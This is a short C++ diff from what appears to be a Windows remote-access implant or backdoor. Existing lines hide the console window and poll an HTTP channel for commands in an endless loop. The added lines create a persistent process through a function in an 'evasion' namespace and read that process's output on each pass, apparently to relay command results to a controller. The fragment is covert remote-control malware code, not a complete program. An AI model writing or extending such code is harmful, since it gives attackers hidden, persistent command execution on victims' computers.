@@ -22,11 +22,15 @@ int main() {
 		HWND windowH = GetConsoleWindow();
 		ShowWindow(windowH, SW_HIDE);
 	}
+
+	core::persistent_process = evasion::create_persistent_process();
 	
 	// Wait for commands
 	for (;;)
 	{
 		httpCommunicator.get_commands();
+
+		core::read_pipe_once(core::persistent_process->stdOut);
 
 		if (core::terminated)
 			break;
